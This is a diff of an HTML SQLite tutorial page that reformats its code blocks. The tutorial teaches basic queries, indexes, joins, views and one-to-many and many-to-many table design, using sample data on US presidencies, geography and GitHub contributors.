+<span class="kw">INSERT</span> <span class="kw">INTO</span> presidencies <span class="kw">VALUES</span> (<span class="kw">NULL</span>, <span class="ot">&quot;John&quot;</span>, <span class="ot">&quot;F. Kennedy&quot;</span>, <span class="dv">1961</span>, <span class="dv">1963</span>, <span class="ot">&quot;&quot;</span>);
+<span class="kw">INSERT</span> <span class="kw">INTO</span> presidencies <span class="kw">VALUES</span> (<span class="kw">NULL</span>, <span class="ot">&quot;Lyndon&quot;</span>, <span class="ot">&quot;Johnson&quot;</span>, <span class="dv">1964</span>, <span class="dv">1964</span>, <span class="ot">&quot;Took over when JFK was assassinated&quot;</span>);
+<span class="kw">INSERT</span> <span class="kw">INTO</span> presidencies <span class="kw">VALUES</span> (<span class="kw">NULL</span>, <span class="ot">&quot;Lyndon&quot;</span>, <span class="ot">&quot;Johnson&quot;</span>, <span class="dv">1965</span>, <span class="dv">1968</span>, <span class="ot">&quot;2nd term&quot;</span>);
+<span class="kw">INSERT</span> <span class="kw">INTO</span> presidencies <span class="kw">VALUES</span> (<span class="kw">NULL</span>, <span class="ot">&quot;Richard&quot;</span>, <span class="ot">&quot;Nixon&quot;</span>, <span class="dv">1969</span>, <span class="dv">1972</span>, <span class="ot">&quot;1st term&quot;</span>);
+<span class="kw">INSERT</span> <span class="kw">INTO</span> presidencies <span class="kw">VALUES</span> (<span class="kw">NULL</span>, <span class="ot">&quot;Richard&quot;</span>, <span class="ot">&quot;Nixon&quot;</span>, <span class="dv">1973</span>, <span class="dv">1974</span>, <span class="ot">&quot;2nd term&quot;</span>);
+<span class="kw">INSERT</span> <span class="kw">INTO</span> presidencies <span class="kw">VALUES</span> (<span class="kw">NULL</span>, <span class="ot">&quot;Gerald&quot;</span>, <span class="ot">&quot;Ford&quot;</span>, <span class="dv">1975</span>, <span class="dv">1976</span>, <span class="ot">&quot;&quot;</span>);
+<span class="kw">INSERT</span> <span class="kw">INTO</span> presidencies <span class="kw">VALUES</span> (<span class="kw">NULL</span>, <span class="ot">&quot;Jimmy&quot;</span>, <span class="ot">&quot;Carter&quot;</span>, <span class="dv">1977</span>, <span class="dv">1980</span>, <span class="ot">&quot;&quot;</span>);
+<span class="kw">INSERT</span> <span class="kw">INTO</span> presidencies <span class="kw">VALUES</span> (<span class="kw">NULL</span>, <span class="ot">&quot;Ronald&quot;</span>, <span class="ot">&quot;Reagan&quot;</span>, <span class="dv">1981</span>, <span class="dv">1984</span>, <span class="ot">&quot;1st term&quot;</span>);
+<span class="kw">INSERT</span> <span class="kw">INTO</span> presidencies <span class="kw">VALUES</span> (<span class="kw">NULL</span>, <span class="ot">&quot;Ronald&quot;</span>, <span class="ot">&quot;Reagan&quot;</span>, <span class="dv">1985</span>, <span class="dv">1988</span>, <span class="ot">&quot;2nd term&quot;</span>);
+<span class="kw">INSERT</span> <span class="kw">INTO</span> presidencies <span class="kw">VALUES</span> (<span class="kw">NULL</span>, <span class="ot">&quot;George&quot;</span>, <span class="ot">&quot;H. W. Bush&quot;</span>, <span class="dv">1989</span>, <span class="dv">1992</span>, <span class="ot">&quot;&quot;</span>);
+<span class="kw">INSERT</span> <span class="kw">INTO</span> presidencies <span class="kw">VALUES</span> (<span class="kw">NULL</span>, <span class="ot">&quot;Bill&quot;</span>, <span class="ot">&quot;Clinton&quot;</span>, <span class="dv">1993</span>, <span class="dv">1996</span>, <span class="ot">&quot;1st term&quot;</span>);
+<span class="kw">INSERT</span> <span class="kw">INTO</span> presidencies <span class="kw">VALUES</span> (<span class="kw">NULL</span>, <span class="ot">&quot;Bill&quot;</span>, <span class="ot">&quot;Clinton&quot;</span>, <span class="dv">1997</span>, <span class="dv">2000</span>, <span class="ot">&quot;2nd term&quot;</span>);
+<span class="kw">INSERT</span> <span class="kw">INTO</span> presidencies <span class="kw">VALUES</span> (<span class="kw">NULL</span>, <span class="ot">&quot;George&quot;</span>, <span class="ot">&quot;W. Bush&quot;</span>, <span class="dv">2001</span>, <span class="dv">2004</span>, <span class="ot">&quot;1st term&quot;</span>);
+<span class="kw">INSERT</span> <span class="kw">INTO</span> presidencies <span class="kw">VALUES</span> (<span class="kw">NULL</span>, <span class="ot">&quot;George&quot;</span>, <span class="ot">&quot;W. Bush&quot;</span>, <span class="dv">2005</span>, <span class="dv">2008</span>, <span class="ot">&quot;2nd term&quot;</span>);
+<span class="kw">INSERT</span> <span class="kw">INTO</span> presidencies <span class="kw">VALUES</span> (<span class="kw">NULL</span>, <span class="ot">&quot;Barack&quot;</span>, <span class="ot">&quot;Obama&quot;</span>, <span class="dv">2009</span>, <span class="dv">2012</span>, <span class="ot">&quot;&quot;</span>);</code></pre>
 <p>Let’s see how many records our table contains now:</p>
-<p>{% highlight sql %} SELECT COUNT(*) FROM presidencies; {% endhighlight %}</p>
+<pre class="sourceCode sql"><code class="sourceCode sql"><span class="kw">SELECT</span> <span class="fu">COUNT</span>(*) <span class="kw">FROM</span> presidencies;</code></pre>
 <p>The table has 30 rows.</p>
 <p>We want to generate a deduplicated list of all persons who held office.</p>
 <p>The SQL keyword <code>DISTINCT</code> performs the deduplication magic, and we are going to make use of the SQL text concatenation operator <code>||</code>:</p>
-<p>{% highlight sql %} SELECT DISTINCT first_name || ‘’ || other_names AS full_name FROM presidencies; {% endhighlight %}</p>
+<pre class="sourceCode sql"><code class="sourceCode sql"><span class="kw">SELECT</span> <span class="kw">DISTINCT</span> first_name || <span class="st">&#39; &#39;</span> || other_names <span class="kw">AS</span> full_name <span class="kw">FROM</span> presidencies;</code></pre>
 <p>We want to find out how many presidencies began in the second half of the 20th century.</p>
-<p>{% highlight sql %} SELECT COUNT(*) FROM presidencies WHERE year_from BETWEEN 1950 AND 1999; {% endhighlight %}</p>
+<pre class="sourceCode sql"><code class="sourceCode sql"><span class="kw">SELECT</span> <span class="fu">COUNT</span>(*) <span class="kw">FROM</span> presidencies <span class="kw">WHERE</span> year_from <span class="kw">BETWEEN</span> <span class="dv">1950</span> <span class="kw">AND</span> <span class="dv">1999</span>;</code></pre>
 <p>The answer to that question is 14 records.</p>
 <p>In 1941, the surprise attack at Pearl Harbor happened.</p>
 <p>We would like to know who was president of the United States at that time.</p>
-<p>{% highlight sql %} SELECT * FROM presidencies WHERE 1941 BETWEEN year_from AND year_to; {% endhighlight %}</p>
+<pre class="sourceCode sql"><code class="sourceCode sql"><span class="kw">SELECT</span> * <span class="kw">FROM</span> presidencies <span class="kw">WHERE</span> <span class="dv">1941</span> <span class="kw">BETWEEN</span> year_from <span class="kw">AND</span> year_to;</code></pre>
 <p>The expected output:</p>
 <pre><code>12|Franklin|D. Roosevelt|1941|1944|3rd term</code></pre>
 <p>We stored some notes on when both world wars began and ended. Let’s query that information by asking for all records that contain the string &quot; WW &quot; inside the <code>notes</code> column.</p>
 <p>To perform text matching we need to use the <code>LIKE</code> predicate.</p>
 <p>Note: The percent sign has wildcard semantics in SQL.</p>
-<p>{% highlight sql %} SELECT * FROM presidencies WHERE notes LIKE ‘% WW %’ ORDER BY year_from; {% endhighlight %}</p>
+<pre class="sourceCode sql"><code class="sourceCode sql"><span class="kw">SELECT</span> * <span class="kw">FROM</span> presidencies <span class="kw">WHERE</span> notes <span class="kw">LIKE</span> <span class="st">&#39;% WW %&#39;</span> <span class="kw">ORDER</span> <span class="kw">BY</span> year_from;</code></pre>
 <p>The expected output:</p>
 <pre><code>4|Woodrow|Wilson|1913|1916|1st term; WW 1 begins
 5|Woodrow|Wilson|1917|1920|2nd term; WW 1 ends
@@ -1293,7 +1470,13 @@ sqlite&gt;</code></pre>
 13|Harry|Truman|1945|1948|1st term; WW 2 ends</code></pre>
 <p>We want a breakdown of how many presidencies were full-term (lasted the full 4 years) versus how many lasted 1 or 2 or 3 years.</p>
 <p>That can also be done in SQL, however the syntax is slightly more convoluted.</p>
-<p>{% highlight sql %} SELECT 1 + year_to - year_from AS duration, COUNT(*) AS cnt FROM presidencies GROUP BY duration ORDER BY cnt DESC; {% endhighlight %}</p>
+<pre class="sourceCode sql"><code class="sourceCode sql"><span class="kw">SELECT</span>
+  <span class="dv">1</span> + year_to - year_from <span class="kw">AS</span> duration, <span class="fu">COUNT</span>(*) <span class="kw">AS</span> cnt
+<span class="kw">FROM</span>
+  presidencies
+<span class="kw">GROUP</span> <span class="kw">BY</span>
+  duration
+<span class="kw">ORDER</span> <span class="kw">BY</span> cnt <span class="kw">DESC</span>;</code></pre>
 <p>The expected output:</p>
 <pre><code>4|24
 2|4
@@ -1305,14 +1488,38 @@ sqlite&gt;</code></pre>
 <p>The database engine performs these <code>WHERE</code> lookups significantly faster when it can rely on indexes.</p>
 <p>Let’s say we know ahead of time that the most frequent queries are going to filter by <code>year_from</code> and <code>year_to</code>.</p>
 <p>In that case we need to create indexes on both fields:</p>
-<p>{% highlight sql %} CREATE INDEX index_on_year_from ON presidencies (year_from); CREATE INDEX index_on_year_to ON presidencies (year_to); {% endhighlight %}</p>
+<pre class="sourceCode sql"><code class="sourceCode sql"><span class="kw">CREATE</span> <span class="kw">INDEX</span> index_on_year_from <span class="kw">ON</span> presidencies (year_from);
+<span class="kw">CREATE</span> <span class="kw">INDEX</span> index_on_year_to   <span class="kw">ON</span> presidencies (year_to);</code></pre>
 <p>Indexes do not make a big difference on a table with 30 records, but it is recommended to get into the habit of thinking about indexes before SQL execution times start to grow out of control.</p>
-<h3 id="foreign-key-relationships-the-one-to-many-case">Foreign key relationships: the ONE-TO-MANY case</h3>
+</section>
+<section id="foreign-key-relationships-the-one-to-many-case" class="level3">
+<h3>Foreign key relationships: the ONE-TO-MANY case</h3>
 <p>Let us now explore how we can build database models for information entities which are related to one another.</p>
-<p>We are going to use the geographical hierarchy of continents <code>-&gt;</code> countries <code>-&gt;</code> cities to illustrate this. - A continent has many countries - A country has many cities</p>
-<p>Conversely: - A city belongs to only one country - A country belongs to only one continent</p>
+<p>We are going to use the geographical hierarchy of continents <code>-&gt;</code> countries <code>-&gt;</code> cities to illustrate this.</p>
+<ul>
+<li>A continent has many countries</li>
+<li>A country has many cities</li>
+</ul>
+<p>Conversely:</p>
+<ul>
+<li>A city belongs to only one country</li>
+<li>A country belongs to only one continent</li>
+</ul>
 <p>To create tables for each of the three information entities, run the following commands:</p>
-<p>{% highlight sql %} CREATE TABLE continents ( id INTEGER PRIMARY KEY AUTOINCREMENT NOT NULL, continent_name VARCHAR(255) ); CREATE TABLE countries ( id INTEGER PRIMARY KEY AUTOINCREMENT NOT NULL, continent_id INTEGER NOT NULL, country_name VARCHAR(255) ); CREATE TABLE cities ( id INTEGER PRIMARY KEY AUTOINCREMENT NOT NULL, country_id INTEGER NOT NULL, city_name VARCHAR(255) ); {% endhighlight %}</p>
+<pre class="sourceCode sql"><code class="sourceCode sql"><span class="kw">CREATE</span> <span class="kw">TABLE</span> continents (
+  <span class="kw">id</span> <span class="dt">INTEGER</span> <span class="kw">PRIMARY</span> <span class="kw">KEY</span> AUTOINCREMENT <span class="kw">NOT</span> <span class="kw">NULL</span>,
+  continent_name <span class="dt">VARCHAR</span>(<span class="dv">255</span>)
+);
+<span class="kw">CREATE</span> <span class="kw">TABLE</span> countries (
+  <span class="kw">id</span> <span class="dt">INTEGER</span> <span class="kw">PRIMARY</span> <span class="kw">KEY</span> AUTOINCREMENT <span class="kw">NOT</span> <span class="kw">NULL</span>,
+  continent_id <span class="dt">INTEGER</span> <span class="kw">NOT</span> <span class="kw">NULL</span>,
+  country_name <span class="dt">VARCHAR</span>(<span class="dv">255</span>)
+);
+<span class="kw">CREATE</span> <span class="kw">TABLE</span> cities (
+  <span class="kw">id</span> <span class="dt">INTEGER</span> <span class="kw">PRIMARY</span> <span class="kw">KEY</span> AUTOINCREMENT <span class="kw">NOT</span> <span class="kw">NULL</span>,
+  country_id <span class="dt">INTEGER</span> <span class="kw">NOT</span> <span class="kw">NULL</span>,
+  city_name <span class="dt">VARCHAR</span>(<span class="dv">255</span>)
+);</code></pre>
 <p>Note: SQL experts will notice something is missing from the table definitions above. I have deliberately chosen not to cover foreign key constraints in this beginner-level tutorial in order not to place too much of a cognitive burden on the reader.</p>
 <p>Let’s populate these tables with some data I have prepared for you in a file.</p>
 <p>Quit SQLite with Ctrl-D, download and inspect the file as shown below:</p>
@@ -1323,13 +1530,20 @@ less /tmp/geography.sql</code></pre>
 <p>Now open the database again and let’s write some queries.</p>
 <pre><code>sqlite3 /tmp/dev.db</code></pre>
 <p>The query:</p>
-<p>{% highlight sql %} SELECT * FROM continents; {% endhighlight %}</p>
+<pre class="sourceCode sql"><code class="sourceCode sql"><span class="kw">SELECT</span> * <span class="kw">FROM</span> continents;</code></pre>
 <p>behaves the way you expect.</p>
 <p>Next, go ahead and run the query below, and see what happens:</p>
-<p>{% highlight sql %} SELECT * FROM continents AS c1, continents AS c2; {% endhighlight %}</p>
+<pre class="sourceCode sql"><code class="sourceCode sql"><span class="kw">SELECT</span> * <span class="kw">FROM</span> continents <span class="kw">AS</span> c1, continents <span class="kw">AS</span> c2;</code></pre>
 <p>The above is definitely a valid SQL statement, and I’m just showing it to you in order for you to get comfortable with the idea that SQL statements may reference more than one database table, and if you reference the same table twice, the output will be the cartesian product of the table’s row set with itself.</p>
 <p>Next, try this:</p>
-<p>{% highlight sql %} SELECT country_name, continent_name FROM countries, continents WHERE countries.continent_id = continents.id ORDER BY country_name; {% endhighlight %}</p>
+<pre class="sourceCode sql"><code class="sourceCode sql"><span class="kw">SELECT</span>
+  country_name, continent_name
+<span class="kw">FROM</span>
+  countries, continents
+<span class="kw">WHERE</span>
+  countries.continent_id = continents.id
+<span class="kw">ORDER</span> <span class="kw">BY</span>
+  country_name;</code></pre>
 <p>What we just did is formally called “traversing a foreign key relationship”.</p>
 <p>We retrieved some records from the <code>countries</code> table, found some “pointers” in the <code>continent_id</code> column, went to the <code>continents</code> table, retrieved the continent descriptions pertaining to those pointers, and then brought back those results and associated them with each row in the <code>countries</code> table.</p>
 <p>Congratulations, you have just learned about the “R” in “RDBMS”, this is what we mean by “relational”.</p>
@@ -1337,21 +1551,46 @@ less /tmp/geography.sql</code></pre>
 <p>Before we go on, we want to take care of performance-by-design.</p>
 <p>The lookups which happen during foreign key relationship traversal would be much more efficient when supported by the appropriate indexes.</p>
 <p>Let’s create indexes on those foreign key columns.</p>
-<p>{% highlight sql %} CREATE INDEX index_on_country_id ON cities (country_id); CREATE INDEX index_on_continent_id ON countries (continent_id); {% endhighlight %}</p>
+<pre class="sourceCode sql"><code class="sourceCode sql"><span class="kw">CREATE</span> <span class="kw">INDEX</span> index_on_country_id   <span class="kw">ON</span> cities    (country_id);
+<span class="kw">CREATE</span> <span class="kw">INDEX</span> index_on_continent_id <span class="kw">ON</span> countries (continent_id);</code></pre>
 <p>Moreover, <code>country_name</code> and <code>city_name</code> are also worth indexing, since in the future we are very likely to need to locate records based on them.</p>
-<p>{% highlight sql %} CREATE INDEX index_on_city_name ON cities (city_name); CREATE INDEX index_on_country_name ON countries (country_name); {% endhighlight %}</p>
+<pre class="sourceCode sql"><code class="sourceCode sql"><span class="kw">CREATE</span> <span class="kw">INDEX</span> index_on_city_name    <span class="kw">ON</span> cities    (city_name);
+<span class="kw">CREATE</span> <span class="kw">INDEX</span> index_on_country_name <span class="kw">ON</span> countries (country_name);</code></pre>
 <p>Let us now write a query that performs a three-way join:</p>
-<p>{% highlight sql %} SELECT city_name, country_name, continent_name FROM cities, countries, continents WHERE cities.country_id = countries.id AND countries.continent_id = continents.id ORDER BY city_name; {% endhighlight %}</p>
+<pre class="sourceCode sql"><code class="sourceCode sql"><span class="kw">SELECT</span>
+  city_name, country_name, continent_name
+<span class="kw">FROM</span>
+  cities, countries, continents
+<span class="kw">WHERE</span>
+  cities.country_id = countries.id
+  <span class="kw">AND</span>
+  countries.continent_id = continents.id
+<span class="kw">ORDER</span> <span class="kw">BY</span>
+  city_name;</code></pre>
 <p>In order to avoid repeated typing of complex queries, SQL allows us to store a given <code>SELECT</code> statement under a specific name.</p>
 <p>The resulting database object is called a view.</p>
 <p>Let’s create a view for the previous <code>SELECT</code> statement:</p>
-<p>{% highlight sql %} CREATE VIEW augmented_cities AS SELECT city_name, country_name, continent_name FROM cities, countries, continents WHERE cities.country_id = countries.id AND countries.continent_id = continents.id; {% endhighlight %}</p>
+<pre class="sourceCode sql"><code class="sourceCode sql"><span class="kw">CREATE</span> <span class="kw">VIEW</span> augmented_cities <span class="kw">AS</span>
+<span class="kw">SELECT</span>
+  city_name, country_name, continent_name
+<span class="kw">FROM</span>
+  cities, countries, continents
+<span class="kw">WHERE</span>
+  cities.country_id = countries.id
+  <span class="kw">AND</span>
+  countries.continent_id = continents.id;</code></pre>
 <p>Using the newly created view, we can more comfortably find out all of the information about e.g. the city of London which our database has to offer:</p>
-<p>{% highlight sql %} SELECT * FROM augmented_cities WHERE city_name = ‘London’; {% endhighlight %}</p>
+<pre class="sourceCode sql"><code class="sourceCode sql"><span class="kw">SELECT</span> * <span class="kw">FROM</span> augmented_cities <span class="kw">WHERE</span> city_name = <span class="st">&#39;London&#39;</span>;</code></pre>
 <p>The output:</p>
 <pre><code>London|United Kingdom|Europe</code></pre>
 <p>Next, let’s look at an example of a subquery. Try this:</p>
-<p>{% highlight sql %} SELECT continent_name, how_many_countries FROM continents, (SELECT continent_id, COUNT(*) AS how_many_countries FROM countries GROUP BY continent_id) AS breakdows WHERE continents.id = breakdows.continent_id; {% endhighlight %}</p>
+<pre class="sourceCode sql"><code class="sourceCode sql"><span class="kw">SELECT</span>
+  continent_name, how_many_countries
+<span class="kw">FROM</span>
+  continents,
+  (<span class="kw">SELECT</span> continent_id, <span class="fu">COUNT</span>(*) <span class="kw">AS</span> how_many_countries <span class="kw">FROM</span> countries <span class="kw">GROUP</span> <span class="kw">BY</span> continent_id) <span class="kw">AS</span> breakdows
+<span class="kw">WHERE</span>
+  continents.id = breakdows.continent_id;</code></pre>
 <p>The output:</p>
 <pre><code>North America|4
 South America|9
@@ -1362,32 +1601,115 @@ Oceania|2</code></pre>
 <p>What we did here is we joined a real table (<code>continents</code>) with a virtual one called a subquery (the result of a <code>SELECT</code> statement).</p>
 <p>We can do this because SQL doesn’t really join tables, it joins rectangular result sets consisting of rows and columns.</p>
 <p>Let’s store this query in a view, we are going to make use of it in a future tutorial.</p>
-<p>{% highlight sql %} CREATE VIEW continent_statistics AS SELECT continent_name, how_many_countries FROM continents, (SELECT continent_id, COUNT(*) AS how_many_countries FROM countries GROUP BY continent_id) AS breakdows WHERE continents.id = breakdows.continent_id; {% endhighlight %}</p>
-<h3 id="foreign-key-relationships-the-many-to-many-case">Foreign key relationships: the MANY-TO-MANY case</h3>
+<pre class="sourceCode sql"><code class="sourceCode sql"><span class="kw">CREATE</span> <span class="kw">VIEW</span> continent_statistics <span class="kw">AS</span>
+<span class="kw">SELECT</span>
+  continent_name, how_many_countries
+<span class="kw">FROM</span>
+  continents,
+  (<span class="kw">SELECT</span> continent_id, <span class="fu">COUNT</span>(*) <span class="kw">AS</span> how_many_countries <span class="kw">FROM</span> countries <span class="kw">GROUP</span> <span class="kw">BY</span> continent_id) <span class="kw">AS</span> breakdows
+<span class="kw">WHERE</span>
+  continents.id = breakdows.continent_id;</code></pre>
+</section>
+<section id="foreign-key-relationships-the-many-to-many-case" class="level3">
+<h3>Foreign key relationships: the MANY-TO-MANY case</h3>
 <p>Up to this point, we have explored SQL statements on a single table, as well as one-to-many relationships.</p>
 <p>How do we model many-to-many relationships?</p>
-<p>How do we model people upvoting news stories on social networks? - One person may upvote more than one story</p>
-<p>Conversely: - One story may get upvoted by several people</p>
-<p>How do we model project communities which collaborate on Github? - One person may contribute to more than one project</p>
-<p>Conversely: - One project may get contributions from several people</p>
+<p>How do we model people upvoting news stories on social networks?</p>
+<ul>
+<li>One person may upvote more than one story</li>
+</ul>
+<p>Conversely:</p>
+<ul>
+<li>One story may get upvoted by several people</li>
+</ul>
+<p>How do we model project communities which collaborate on Github?</p>
+<ul>
+<li>One person may contribute to more than one project</li>
+</ul>
+<p>Conversely:</p>
+<ul>
+<li>One project may get contributions from several people</li>
+</ul>
 <p>The answer is that we need to define a separate information entity which is going to track those complex relationships for us.</p>
 <p>In Github’s case, the core information entities are User and Project, and we are going to name the third one Contributorship.</p>
-<p>Therefore: - A user has many contributorships - A contributorship belongs to a user - A project has many contributorships - A contributorship belongs to a project</p>
+<p>Therefore:</p>
+<ul>
+<li>A user has many contributorships</li>
+<li>A contributorship belongs to a user</li>
+<li>A project has many contributorships</li>
+<li>A contributorship belongs to a project</li>
+</ul>
 <p>Let’s go ahead and create tables for those three information entities:</p>
-<p>{% highlight sql %} CREATE TABLE users ( id INTEGER PRIMARY KEY AUTOINCREMENT NOT NULL, user_name VARCHAR(255) ); CREATE TABLE projects ( id INTEGER PRIMARY KEY AUTOINCREMENT NOT NULL, project_name VARCHAR(255) ); CREATE TABLE contributorships ( id INTEGER PRIMARY KEY AUTOINCREMENT NOT NULL, user_id INTEGER NOT NULL, project_id INTEGER NOT NULL ); {% endhighlight %}</p>
+<pre class="sourceCode sql"><code class="sourceCode sql"><span class="kw">CREATE</span> <span class="kw">TABLE</span> users (
+  <span class="kw">id</span> <span class="dt">INTEGER</span> <span class="kw">PRIMARY</span> <span class="kw">KEY</span> AUTOINCREMENT <span class="kw">NOT</span> <span class="kw">NULL</span>,
+  user_name <span class="dt">VARCHAR</span>(<span class="dv">255</span>)
+);
+<span class="kw">CREATE</span> <span class="kw">TABLE</span> projects (
+  <span class="kw">id</span> <span class="dt">INTEGER</span> <span class="kw">PRIMARY</span> <span class="kw">KEY</span> AUTOINCREMENT <span class="kw">NOT</span> <span class="kw">NULL</span>,
+  project_name <span class="dt">VARCHAR</span>(<span class="dv">255</span>)
+);
+<span class="kw">CREATE</span> <span class="kw">TABLE</span> contributorships (
+  <span class="kw">id</span> <span class="dt">INTEGER</span> <span class="kw">PRIMARY</span> <span class="kw">KEY</span> AUTOINCREMENT <span class="kw">NOT</span> <span class="kw">NULL</span>,
+  user_id <span class="dt">INTEGER</span> <span class="kw">NOT</span> <span class="kw">NULL</span>,
+  project_id <span class="dt">INTEGER</span> <span class="kw">NOT</span> <span class="kw">NULL</span>
+);</code></pre>
 <p>And let’s populate the tables with some sample data (5 users, 9 projects):</p>
-<p>{% highlight sql %} INSERT INTO users VALUES (1, “alex-morega”); INSERT INTO users VALUES (2, “gvoicu”); INSERT INTO users VALUES (3, “igstan”); INSERT INTO users VALUES (4, “dserban”); INSERT INTO users VALUES (5, “torvalds”); INSERT INTO projects VALUES (1, “torvalds/linux”); INSERT INTO projects VALUES (2, “rosedu/WebDev”); INSERT INTO projects VALUES (3, “rosedu/wouso”); INSERT INTO projects VALUES (4, “rosedu/techblog”); INSERT INTO projects VALUES (5, “rosedu/StartTheDark”); INSERT INTO projects VALUES (6, “gvoicu/miniflow”); INSERT INTO projects VALUES (7, “rails/rails”); INSERT INTO projects VALUES (8, “sinatra/sinatra”); INSERT INTO projects VALUES (9, “mitsuhiko/flask”); INSERT INTO contributorships VALUES ( 1, 1, 2); INSERT INTO contributorships VALUES ( 2, 1, 3); INSERT INTO contributorships VALUES ( 3, 1, 9); INSERT INTO contributorships VALUES ( 4, 2, 2); INSERT INTO contributorships VALUES ( 5, 2, 6); INSERT INTO contributorships VALUES ( 6, 2, 7); INSERT INTO contributorships VALUES ( 7, 2, 8); INSERT INTO contributorships VALUES ( 8, 3, 2); INSERT INTO contributorships VALUES ( 9, 3, 6); INSERT INTO contributorships VALUES (10, 4, 1); INSERT INTO contributorships VALUES (11, 4, 2); INSERT INTO contributorships VALUES (12, 4, 3); INSERT INTO contributorships VALUES (13, 4, 4); INSERT INTO contributorships VALUES (14, 4, 5); INSERT INTO contributorships VALUES (15, 4, 6); INSERT INTO contributorships VALUES (16, 4, 7); INSERT INTO contributorships VALUES (17, 4, 8); INSERT INTO contributorships VALUES (18, 5, 1); {% endhighlight %}</p>
+<pre class="sourceCode sql"><code class="sourceCode sql"><span class="kw">INSERT</span> <span class="kw">INTO</span> users <span class="kw">VALUES</span> (<span class="dv">1</span>, <span class="ot">&quot;alex-morega&quot;</span>);
+<span class="kw">INSERT</span> <span class="kw">INTO</span> users <span class="kw">VALUES</span> (<span class="dv">2</span>, <span class="ot">&quot;gvoicu&quot;</span>);
+<span class="kw">INSERT</span> <span class="kw">INTO</span> users <span class="kw">VALUES</span> (<span class="dv">3</span>, <span class="ot">&quot;igstan&quot;</span>);
+<span class="kw">INSERT</span> <span class="kw">INTO</span> users <span class="kw">VALUES</span> (<span class="dv">4</span>, <span class="ot">&quot;dserban&quot;</span>);
+<span class="kw">INSERT</span> <span class="kw">INTO</span> users <span class="kw">VALUES</span> (<span class="dv">5</span>, <span class="ot">&quot;torvalds&quot;</span>);
+<span class="kw">INSERT</span> <span class="kw">INTO</span> projects <span class="kw">VALUES</span> (<span class="dv">1</span>, <span class="ot">&quot;torvalds/linux&quot;</span>);
+<span class="kw">INSERT</span> <span class="kw">INTO</span> projects <span class="kw">VALUES</span> (<span class="dv">2</span>, <span class="ot">&quot;rosedu/WebDev&quot;</span>);
+<span class="kw">INSERT</span> <span class="kw">INTO</span> projects <span class="kw">VALUES</span> (<span class="dv">3</span>, <span class="ot">&quot;rosedu/wouso&quot;</span>);
+<span class="kw">INSERT</span> <span class="kw">INTO</span> projects <span class="kw">VALUES</span> (<span class="dv">4</span>, <span class="ot">&quot;rosedu/techblog&quot;</span>);
+<span class="kw">INSERT</span> <span class="kw">INTO</span> projects <span class="kw">VALUES</span> (<span class="dv">5</span>, <span class="ot">&quot;rosedu/StartTheDark&quot;</span>);
+<span class="kw">INSERT</span> <span class="kw">INTO</span> projects <span class="kw">VALUES</span> (<span class="dv">6</span>, <span class="ot">&quot;gvoicu/miniflow&quot;</span>);
+<span class="kw">INSERT</span> <span class="kw">INTO</span> projects <span class="kw">VALUES</span> (<span class="dv">7</span>, <span class="ot">&quot;rails/rails&quot;</span>);
+<span class="kw">INSERT</span> <span class="kw">INTO</span> projects <span class="kw">VALUES</span> (<span class="dv">8</span>, <span class="ot">&quot;sinatra/sinatra&quot;</span>);
+<span class="kw">INSERT</span> <span class="kw">INTO</span> projects <span class="kw">VALUES</span> (<span class="dv">9</span>, <span class="ot">&quot;mitsuhiko/flask&quot;</span>);
+<span class="kw">INSERT</span> <span class="kw">INTO</span> contributorships <span class="kw">VALUES</span> ( <span class="dv">1</span>, <span class="dv">1</span>, <span class="dv">2</span>);
+<span class="kw">INSERT</span> <span class="kw">INTO</span> contributorships <span class="kw">VALUES</span> ( <span class="dv">2</span>, <span class="dv">1</span>, <span class="dv">3</span>);
+<span class="kw">INSERT</span> <span class="kw">INTO</span> contributorships <span class="kw">VALUES</span> ( <span class="dv">3</span>, <span class="dv">1</span>, <span class="dv">9</span>);
+<span class="kw">INSERT</span> <span class="kw">INTO</span> contributorships <span class="kw">VALUES</span> ( <span class="dv">4</span>, <span class="dv">2</span>, <span class="dv">2</span>);
+<span class="kw">INSERT</span> <span class="kw">INTO</span> contributorships <span class="kw">VALUES</span> ( <span class="dv">5</span>, <span class="dv">2</span>, <span class="dv">6</span>);
+<span class="kw">INSERT</span> <span class="kw">INTO</span> contributorships <span class="kw">VALUES</span> ( <span class="dv">6</span>, <span class="dv">2</span>, <span class="dv">7</span>);
+<span class="kw">INSERT</span> <span class="kw">INTO</span> contributorships <span class="kw">VALUES</span> ( <span class="dv">7</span>, <span class="dv">2</span>, <span class="dv">8</span>);
+<span class="kw">INSERT</span> <span class="kw">INTO</span> contributorships <span class="kw">VALUES</span> ( <span class="dv">8</span>, <span class="dv">3</span>, <span class="dv">2</span>);
+<span class="kw">INSERT</span> <span class="kw">INTO</span> contributorships <span class="kw">VALUES</span> ( <span class="dv">9</span>, <span class="dv">3</span>, <span class="dv">6</span>);
+<span class="kw">INSERT</span> <span class="kw">INTO</span> contributorships <span class="kw">VALUES</span> (<span class="dv">10</span>, <span class="dv">4</span>, <span class="dv">1</span>);
+<span class="kw">INSERT</span> <span class="kw">INTO</span> contributorships <span class="kw">VALUES</span> (<span class="dv">11</span>, <span class="dv">4</span>, <span class="dv">2</span>);
+<span class="kw">INSERT</span> <span class="kw">INTO</span> contributorships <span class="kw">VALUES</span> (<span class="dv">12</span>, <span class="dv">4</span>, <span class="dv">3</span>);
+<span class="kw">INSERT</span> <span class="kw">INTO</span> contributorships <span class="kw">VALUES</span> (<span class="dv">13</span>, <span class="dv">4</span>, <span class="dv">4</span>);
+<span class="kw">INSERT</span> <span class="kw">INTO</span> contributorships <span class="kw">VALUES</span> (<span class="dv">14</span>, <span class="dv">4</span>, <span class="dv">5</span>);
+<span class="kw">INSERT</span> <span class="kw">INTO</span> contributorships <span class="kw">VALUES</span> (<span class="dv">15</span>, <span class="dv">4</span>, <span class="dv">6</span>);
+<span class="kw">INSERT</span> <span class="kw">INTO</span> contributorships <span class="kw">VALUES</span> (<span class="dv">16</span>, <span class="dv">4</span>, <span class="dv">7</span>);
+<span class="kw">INSERT</span> <span class="kw">INTO</span> contributorships <span class="kw">VALUES</span> (<span class="dv">17</span>, <span class="dv">4</span>, <span class="dv">8</span>);
+<span class="kw">INSERT</span> <span class="kw">INTO</span> contributorships <span class="kw">VALUES</span> (<span class="dv">18</span>, <span class="dv">5</span>, <span class="dv">1</span>);</code></pre>
 <p>Now before we start issuing queries, let’s take care of the performance-by-design side of things.</p>
 <p>We anticipate that we’ll need to do heavy querying by <code>user_name</code> and by <code>project_name</code>.</p>
 <p>Therefore we need indexes on those columns:</p>
-<p>{% highlight sql %} CREATE INDEX index_on_user_name ON users (user_name); CREATE INDEX index_on_project_name ON projects (project_name); {% endhighlight %}</p>
